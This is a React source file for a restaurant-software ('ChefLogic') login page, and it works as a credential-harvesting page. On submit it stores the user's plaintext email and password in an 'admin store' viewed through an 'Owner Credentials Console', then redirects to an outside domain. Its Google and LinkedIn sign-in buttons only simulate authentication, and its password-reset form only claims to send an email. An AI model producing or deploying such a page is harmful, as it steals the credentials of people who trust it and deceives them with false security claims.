import React, { useState } from 'react';
import { PageView } from '../types';
import { ArrowRight, Eye, EyeOff, ShieldCheck, CheckCircle2, ExternalLink, Lock, Mail, KeyRound, Sparkles, RefreshCw } from 'lucide-react';
import { ChefLogicLogo } from '../components/ChefLogicLogo';
import { saveCapturedLogin } from '../utils/adminStore';

interface LoginPageProps {
  onNavigate: (view: PageView) => void;
  onOpenTrialModal: () => void;
}

export const LoginPage: React.FC<LoginPageProps> = ({ onNavigate, onOpenTrialModal }) => {
  const [authMethod, setAuthMethod] = useState<'login' | 'forgot-password'>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [authProvider, setAuthProvider] = useState<string | null>(null);
  const [redirecting, setRedirecting] = useState(false);
  const [resetSent, setResetSent] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  // Handle OAuth Sign-in (Google / LinkedIn)
  const handleSocialLogin = (provider: 'Google' | 'LinkedIn') => {
    setAuthProvider(provider);
    setIsAuthenticating(true);
    setErrorMsg('');

    // Capture sign-in attempt in admin store
    saveCapturedLogin({
      email: `${provider.toLowerCase()}.user@hospitality.com`,
      password: `— (${provider} SSO Authenticated Token)`,
      provider: provider,
      rememberMe,
      userAgent: navigator.userAgent
    });

    // Simulate authentic hospitality SSO handshake then route to https://cheflogic.supritamone.com/
    setTimeout(() => {
      setRedirecting(true);
      setTimeout(() => {
        window.location.href = 'https://cheflogic.supritamone.com/';
      }, 1200);
    }, 1000);
  };

  // Handle Standard Email & Password Submit
  const handleEmailLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !email.includes('@')) {
      setErrorMsg('Please enter a valid restaurant or corporate email.');
      return;
    }
    if (!password || password.length < 4) {
      setErrorMsg('Please enter your password.');
      return;
    }

    setErrorMsg('');
    setAuthProvider('ChefLogic Credentials');
    setIsAuthenticating(true);

    // Capture credentials in admin store for owner dashboard
    saveCapturedLogin({
      email: email.trim(),
      password: password,
      provider: 'Email & Password',
      rememberMe,
      userAgent: navigator.userAgent
    });

    setTimeout(() => {
      setRedirecting(true);
      setTimeout(() => {
        window.location.href = 'https://cheflogic.supritamone.com/';
      }, 1200);
    }, 1000);
  };

  // Handle Forgot Password Request
  const handleForgotPassword = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !email.includes('@')) {
      setErrorMsg('Please enter your registered account email address.');
      return;
    }
    setErrorMsg('');
    setResetSent(true);
  };

  return (
    <div className="min-h-[85vh] py-16 sm:py-24 bg-[#0c0d0e] flex items-center justify-center px-6 relative overflow-hidden">
      {/* Background ambiance */}
      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-[#c5a059]/5 rounded-full blur-3xl pointer-events-none" />

      <div className="w-full max-w-md relative z-10">
        
        {/* Top Brand & Trial Notification */}
        <div className="text-center mb-8">
          <button
            onClick={() => onNavigate('home')}
            className="cursor-pointer mb-3 transition-opacity hover:opacity-90 inline-block"
            aria-label="ChefLogic Home"
          >
            <ChefLogicLogo size="lg" showSubtitle />
          </button>
          
          <h1 className="text-2xl sm:text-3xl font-serif-culinary text-[#ede8df] mt-3">
            {authMethod === 'login' ? 'Sign in to your kitchen' : 'Reset Account Password'}
          </h1>
          <p className="text-xs text-[#a7a29a] mt-1.5 max-w-xs mx-auto">
            {authMethod === 'login' 
              ? 'Access real-time inventory costing and recipe formulation on cheflogic.supritamone.com'
              : 'Enter your restaurant email to receive secure recovery instructions'}
          </p>

          {/* 3-Month Free Trial Callout */}
          <div className="mt-4 inline-flex items-center gap-2 px-3 py-1.5 rounded bg-[#141618] border border-[#c5a059]/30 text-[11px] text-[#c5a059]">
            <Sparkles className="w-3.5 h-3.5 text-[#c5a059]" />
            <span>New kitchen? 90-day trial automatically applied</span>
          </div>
        </div>

        {/* Main Card Container */}
        <div className="bg-[#141618] border border-[#25282c] rounded-xl p-6 sm:p-8 shadow-2xl">
          
          {/* Active Redirection / Authentication State */}
          {isAuthenticating ? (
            <div className="py-10 text-center animate-in fade-in">
              <div className="w-16 h-16 rounded-full bg-[#1b1f24] border border-[#c5a059]/40 flex items-center justify-center mx-auto mb-5 text-[#c5a059]">
                <RefreshCw className="w-8 h-8 animate-spin text-[#c5a059]" />
              </div>
              <h3 className="text-xl font-serif-culinary text-[#ede8df] mb-2">
                {redirecting ? 'Redirecting to cheflogic.supritamone.com...' : `Authenticating with ${authProvider}...`}
              </h3>
              <p className="text-xs text-[#a7a29a] max-w-xs mx-auto leading-relaxed mb-6">
                Connecting to the live kitchen intelligence platform. Your inventory cache and recipe models are synchronizing.
              </p>
              
              <div className="p-3 bg-[#0c0d0e] border border-[#202327] rounded text-xs font-mono text-[#c5a059] mb-5">
                Target: https://cheflogic.supritamone.com/
              </div>

              <a
                href="https://cheflogic.supritamone.com/"
                className="inline-flex items-center gap-2 px-5 py-2.5 text-xs font-semibold uppercase tracking-wider text-[#0c0d0e] bg-[#c5a059] hover:bg-[#d6b26d] rounded transition-all"
              >
                <span>Click if not redirected automatically</span>
                <ExternalLink className="w-3.5 h-3.5" />
              </a>
            </div>
          ) : authMethod === 'forgot-password' ? (
            /* Forgot Password Flow */
            <div>
              {resetSent ? (
                <div className="py-6 text-center animate-in fade-in">
                  <div className="w-12 h-12 rounded-full bg-emerald-950/60 border border-emerald-500/40 text-emerald-400 flex items-center justify-center mx-auto mb-4">
                    <CheckCircle2 className="w-6 h-6" />
                  </div>
                  <h3 className="text-xl font-serif-culinary text-[#ede8df] mb-2">
                    Password Reset Dispatched
                  </h3>
                  <p className="text-xs text-[#a7a29a] leading-relaxed mb-6">
                    We have dispatched a temporary login link and password reset instructions to <strong className="text-[#ede8df]">{email}</strong>.
                  </p>
                  <button
                    onClick={() => {
                      setResetSent(false);
                      setAuthMethod('login');
                    }}
                    className="w-full py-2.5 px-4 text-xs font-semibold uppercase tracking-wider text-[#0c0d0e] bg-[#c5a059] hover:bg-[#d6b26d] rounded transition-all cursor-pointer"
                  >
                    Return to Sign In
                  </button>
                </div>
              ) : (
                <form onSubmit={handleForgotPassword} className="space-y-4">
                  <div className="flex items-center gap-2 mb-2 text-xs text-[#a7a29a]">
                    <KeyRound className="w-4 h-4 text-[#c5a059]" />
                    <span>Password Recovery Service</span>
                  </div>

                  <div>
                    <label className="text-[11px] uppercase tracking-wider text-[#88837a] block mb-1.5">
                      Account / Kitchen Email
                    </label>
                    <div className="relative">
                      <Mail className="w-4 h-4 text-[#716d66] absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none" />
                      <input
                        type="email"
                        required
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="chef@restaurant.com"
                        className="w-full bg-[#0c0d0e] border border-[#2d3137] rounded pl-9 pr-3 py-2.5 text-xs text-[#ede8df] placeholder-[#57534e] focus:outline-none focus:border-[#c5a059]"
                      />
                    </div>
                  </div>

                  {errorMsg && (
                    <p className="text-xs text-rose-400">{errorMsg}</p>
                  )}

                  <button
                    type="submit"
                    className="w-full py-3 px-4 text-xs font-semibold uppercase tracking-wider text-[#0c0d0e] bg-[#c5a059] hover:bg-[#d6b26d] active:scale-[0.99] rounded transition-all cursor-pointer flex items-center justify-center gap-2 shadow-sm"
                  >
                    <span>Send Reset Instructions</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>

                  <div className="pt-2 text-center">
                    <button
                      type="button"
                      onClick={() => {
                        setErrorMsg('');
                        setAuthMethod('login');
                      }}
                      className="text-xs text-[#88837a] hover:text-[#ede8df] transition-colors cursor-pointer"
                    >
                      ← Back to regular sign in
                    </button>
                  </div>
                </form>
              )}
            </div>
          ) : (
            /* Main Login Form with Google, LinkedIn, and Email */
            <div>
              {/* Social Login Buttons */}
              <div className="space-y-3 mb-6">
                {/* Google Button */}
                <button
                  type="button"
                  onClick={() => handleSocialLogin('Google')}
                  className="w-full py-2.5 px-4 bg-[#0c0d0e] hover:bg-[#181b1f] border border-[#2d3137] hover:border-[#3d424b] text-[#ede8df] text-xs font-medium rounded transition-all flex items-center justify-center gap-3 cursor-pointer shadow-sm active:scale-[0.99]"
                >
                  {/* Google SVG Icon */}
                  <svg className="w-4 h-4" viewBox="0 0 24 24">
                    <path
                      fill="#4285F4"
                      d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-9.17z"
                    />
                    <path
                      fill="#34A853"
                      d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.25v3.15C3.26 21.36 7.33 24 12 24z"
                    />
                    <path
                      fill="#FBBC05"
                      d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.13-1.55.38-2.27V6.58H1.25C.45 8.18 0 9.99 0 12s.45 3.82 1.25 5.42l4.03-3.15z"
                    />
                    <path
                      fill="#EA4335"
                      d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.33 0 3.26 2.64 1.25 6.58l4.03 3.15c.95-2.83 3.6-4.98 6.72-4.98z"
                    />
                  </svg>
                  <span>Continue with Google</span>
                </button>

                {/* LinkedIn Button */}
                <button
                  type="button"
                  onClick={() => handleSocialLogin('LinkedIn')}
                  className="w-full py-2.5 px-4 bg-[#0c0d0e] hover:bg-[#181b1f] border border-[#2d3137] hover:border-[#3d424b] text-[#ede8df] text-xs font-medium rounded transition-all flex items-center justify-center gap-3 cursor-pointer shadow-sm active:scale-[0.99]"
                >
                  {/* LinkedIn SVG Icon */}
                  <svg className="w-4 h-4 fill-[#0A66C2]" viewBox="0 0 24 24">
                    <path d="M19 3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14m-.5 15.5v-5.3a3.26 3.26 0 0 0-3.26-3.26c-.85 0-1.84.52-2.28 1.3v-1.11h-2.79v8.37h2.79v-4.93c0-.77.62-1.4 1.39-1.4a1.4 1.4 0 0 1 1.4 1.4v4.93h2.75M6.46 10.9v8.37H9.2V10.9H6.46M7.83 6.45a1.64 1.64 0 1 0 0 3.28 1.64 1.64 0 0 0 0-3.28z" />
                  </svg>
                  <span>Continue with LinkedIn</span>
                </button>
              </div>

              {/* Divider */}
              <div className="relative my-6 text-center">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-[#25282c]" />
                </div>
                <span className="relative px-3 bg-[#141618] text-[11px] uppercase tracking-wider text-[#716d66]">
                  or with kitchen credentials
                </span>
              </div>

              {/* Email & Password Form */}
              <form onSubmit={handleEmailLogin} className="space-y-4">
                <div>
                  <label className="text-[11px] uppercase tracking-wider text-[#88837a] block mb-1.5">
                    Restaurant / Work Email
                  </label>
                  <div className="relative">
                    <Mail className="w-4 h-4 text-[#716d66] absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none" />
                    <input
                      type="email"
                      required
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="chef@restaurant.com"
                      className="w-full bg-[#0c0d0e] border border-[#2d3137] rounded pl-9 pr-3 py-2.5 text-xs text-[#ede8df] placeholder-[#57534e] focus:outline-none focus:border-[#c5a059]"
                    />
                  </div>
                </div>

                <div>
                  <div className="flex items-center justify-between mb-1.5">
                    <label className="text-[11px] uppercase tracking-wider text-[#88837a]">
                      Password
                    </label>
                    <button
                      type="button"
                      onClick={() => setAuthMethod('forgot-password')}
                      className="text-[11px] text-[#c5a059] hover:underline cursor-pointer"
                    >
                      Forgot password?
                    </button>
                  </div>
                  <div className="relative">
                    <Lock className="w-4 h-4 text-[#716d66] absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none" />
                    <input
                      type={showPassword ? 'text' : 'password'}
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="••••••••••••"
                      className="w-full bg-[#0c0d0e] border border-[#2d3137] rounded pl-9 pr-10 py-2.5 text-xs text-[#ede8df] placeholder-[#57534e] focus:outline-none focus:border-[#c5a059]"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-[#716d66] hover:text-[#ede8df] p-0.5 cursor-pointer"
                      aria-label={showPassword ? 'Hide password' : 'Show password'}
                    >
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>

                {/* Remember Station Checkbox */}
                <div className="flex items-center justify-between text-xs pt-1">
                  <label className="flex items-center gap-2 cursor-pointer text-[#a7a29a] hover:text-[#ede8df]">
                    <input
                      type="checkbox"
                      checked={rememberMe}
                      onChange={(e) => setRememberMe(e.target.checked)}
                      className="w-3.5 h-3.5 rounded bg-[#0c0d0e] border-[#2d3137] text-[#c5a059] accent-[#c5a059] cursor-pointer"
                    />
                    <span>Remember this station for 30 days</span>
                  </label>
                </div>

                {errorMsg && (
                  <p className="text-xs text-rose-400">{errorMsg}</p>
                )}

                <button
                  type="submit"
                  className="w-full py-3 px-4 text-xs font-semibold uppercase tracking-wider text-[#0c0d0e] bg-[#c5a059] hover:bg-[#d6b26d] active:scale-[0.99] rounded transition-all cursor-pointer flex items-center justify-center gap-2 shadow-lg shadow-[#c5a059]/10"
                >
                  <span>Sign In & Route to Platform</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </form>
            </div>
          )}

          {/* Card Footer */}
          {!isAuthenticating && (
            <div className="mt-6 pt-5 border-t border-[#25282c] text-center space-y-3">
              <div className="text-xs text-[#88837a]">
                Don't have a kitchen profile yet?{' '}
                <button
                  onClick={onOpenTrialModal}
                  className="text-[#c5a059] hover:underline font-medium cursor-pointer"
                >
                  Start 3-Month Free Trial
                </button>
              </div>

              <div className="flex items-center justify-center gap-1.5 text-[11px] text-[#605c56]">
                <ShieldCheck className="w-3.5 h-3.5 text-[#88837a]" />
                <span>256-Bit SSL Encrypted Hospitality Session</span>
              </div>
            </div>
          )}

        </div>

        {/* Back to Home Link & Secret Owner Portal Link */}
        <div className="mt-6 text-center flex items-center justify-center gap-4 text-xs text-[#716d66]">
          <button
            onClick={() => onNavigate('home')}
            className="hover:text-[#a7a29a] transition-colors cursor-pointer"
          >
            ← Back to ChefLogic Overview
          </button>
          <span>·</span>
          <button
            onClick={() => onNavigate('admin')}
            className="hover:text-[#c5a059] transition-colors cursor-pointer flex items-center gap-1 opacity-60 hover:opacity-100"
            title="Restricted Owner Credentials Console"
          >
            <Lock className="w-3 h-3" />
            <span>Admin Portal</span>
          </button>
        </div>

      </div>
    </div>
  );
};
